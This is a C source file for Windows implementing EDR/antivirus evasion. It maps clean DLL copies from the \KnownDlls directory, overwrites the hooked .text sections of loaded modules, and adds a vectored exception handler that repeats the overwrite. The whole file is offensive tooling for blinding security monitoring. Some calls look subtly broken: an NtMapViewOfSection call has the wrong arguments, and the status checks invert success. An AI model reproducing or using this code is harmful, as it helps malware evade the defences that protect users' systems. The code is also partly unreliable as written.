#include "unhook.h"

SIZE_T					g_sTextSectionSize              = (SIZE_T) NULL;
LPVOID					g_pLocalTxtSectionAddress       = NULL;
LPVOID					g_pKnownDllTxtSectionAddress    = NULL;

UINT32 CRC32B(LPCSTR cString)
{
    UINT32      uMask   = 0x00, uHash   = 0xFFFFFFFF;
    INT         i       = 0x00;
    while (cString[i] != 0)
    {
        uHash = uHash ^ (UINT32)cString[i];
        for (int ii = 0; ii < 8; ii++)
        {
            uMask = -1 * (uHash & 1);
            uHash = (uHash >> 1) ^ (CRC_POLYNOMIAL & uMask);
        }
        i++;
    }
    return ~uHash;
}

LPVOID MapDllFromKnownDllDir(IN PWSTR szDllName)
{
    PVOID                  pModule                 = NULL;
    HANDLE                 hSection                 = INVALID_HANDLE_VALUE;
    UNICODE_STRING         UniString               = { 0 };
    OBJECT_ATTRIBUTES      ObjectiveAttr           = { 0 };
    SIZE_T                 sViewSize               = (SIZE_T) NULL;
    NTSTATUS               STATUS                  = 0x00;
    WCHAR                  wFullDllPath [MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

    wcscat(wFullDllPath, szDllName);

    UniString.Buffer = (PWSTR)wFullDllPath;
    UniString.Length = UniString.MaximumLength = wcslen(wFullDllPath) * sizeof(WCHAR);

    InitializeObjectAttributes(&ObjectiveAttr, &UniString, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if ((STATUS = NtMapViewOfSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectiveAttr)) == 0)
    {
        return NULL;
    }

    if ((STATUS = NtMapViewOfSection(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READONLY)) == 0)
    {
        return NULL;
    }

    return pModule;
}

VOID UnhookAllLoadedDlls()
{
    NTSTATUS		STATUS		= 0x00;
    PPEB			pPeb		= (PPEB)__readgsqword(0x60);
    PLIST_ENTRY		pHeadEntry	= &pPeb->LoaderData->InMemoryOrderModuleList,
            pNextEntry	= pHeadEntry->Flink;
    INT			    iModules	= 0x00;

    pNextEntry = pNextEntry->Flink;

    while (pNextEntry != pHeadEntry && iModules < 3)
    {
        PLDR_DATA_TABLE_ENTRY           pLdrDataTblEntry        = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pNextEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        PUNICODE_STRING                 pUnicodeDllName         = (PUNICODE_STRING)((PBYTE)&pLdrDataTblEntry->FullDllName + sizeof(UNICODE_STRING));
        LPVOID				pKnownDllCopy           = MapDllFromKnownDllDir(pUnicodeDllName->Buffer);
        LPVOID       pLocalDllCopy           = (LPVOID)(pLdrDataTblEntry->DllBase);

        SIZE_T				sTextSectionSize                = (SIZE_T) NULL;
        LPVOID				pLocalTxtSectionAddress         = NULL,
                pKnownDllTxtSectionAddress      = NULL;
        DWORD				dwOldProtection                 = 0x00;

        if (pKnownDllCopy && pLocalDllCopy)
        {
            PIMAGE_NT_HEADERS		pLocalImgNtHdrs		    = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLocalDllCopy + ((PIMAGE_DOS_HEADER)pLocalDllCopy)->e_lfanew);
            if (pLocalImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
                goto _CLEANUP;

            PIMAGE_SECTION_HEADER		pLocalImgSecHdr		= IMAGE_FIRST_SECTION(pLocalImgNtHdrs);

            for (int i = 0; i < pLocalImgNtHdrs->FileHeader.NumberOfSections; i++)
            {
                if (CRCHASH(pLocalImgSecHdr[i].Name) == text_CRC32)
                {

                    g_sTextSectionSize            =	sTextSectionSize            = pLocalImgSecHdr[i].Misc.VirtualSize;
                    g_pLocalTxtSectionAddress     =	pLocalTxtSectionAddress     = (LPVOID)((ULONG_PTR)pLocalDllCopy + pLocalImgSecHdr[i].VirtualAddress);
                    g_pKnownDllTxtSectionAddress  =	pKnownDllTxtSectionAddress  = (LPVOID)((ULONG_PTR)pKnownDllCopy + pLocalImgSecHdr[i].VirtualAddress);
                    break;
                }
            }

            // Check if all variables are retrieved
            if (!sTextSectionSize || !pLocalTxtSectionAddress || !pKnownDllTxtSectionAddress)
                goto _CLEANUP;

            if ((STATUS = NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, PAGE_READWRITE, &dwOldProtection)) == 0)
            {
                goto _CLEANUP;
            }

            // Overwriting the hooked .text section with the fresh one
            memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);

            if ((STATUS = NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, dwOldProtection, &dwOldProtection)) == 0)
            {
                goto _CLEANUP;
            }

        }

        _CLEANUP:
        pNextEntry = pNextEntry->Flink;
        iModules++;
        if (pKnownDllCopy) {
            NtUnmapViewOfSection(NtCurrentProcess(), pKnownDllCopy);
        }
    }
}

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
{
    NTSTATUS		STATUS			= 0x00;
    DWORD			dwOldProtection 	= 0x00;

    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION &&
        pExceptionInfo->ExceptionRecord->ExceptionAddress >= g_pLocalTxtSectionAddress &&
        pExceptionInfo->ExceptionRecord->ExceptionAddress <= ((ULONG_PTR)g_pLocalTxtSectionAddress + g_sTextSectionSize))
    {
        if ((STATUS = NtProtectVirtualMemory(NtCurrentProcess(), &g_pLocalTxtSectionAddress, &g_sTextSectionSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) == 0)
        {
            goto _FAILURE;
        }
        memcpy(g_pLocalTxtSectionAddress, g_pKnownDllTxtSectionAddress, g_sTextSectionSize);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    _FAILURE:
    return EXCEPTION_CONTINUE_SEARCH;
}